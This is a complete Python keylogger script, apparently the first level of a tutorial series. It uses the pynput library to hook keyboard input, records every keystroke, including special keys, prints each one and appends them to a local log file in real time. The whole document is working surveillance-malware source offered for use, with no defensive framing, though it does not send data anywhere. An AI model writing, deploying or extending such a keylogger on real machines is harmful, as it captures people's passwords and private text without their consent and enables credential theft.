from pynput import keyboard

LOG_FILE = "keylog_level1.txt"
log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        else:
            log += f" [{key}] "
    
    # Optional: Print to screen
    print(f"Key: {key}")

    # Save to file in real-time
    with open(LOG_FILE, "a") as f:
        f.write(log)
        log = ""  # Clear after writing

def start_keylogger():
    print("[*] Starting Level 1 Keylogger (Local only)...")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
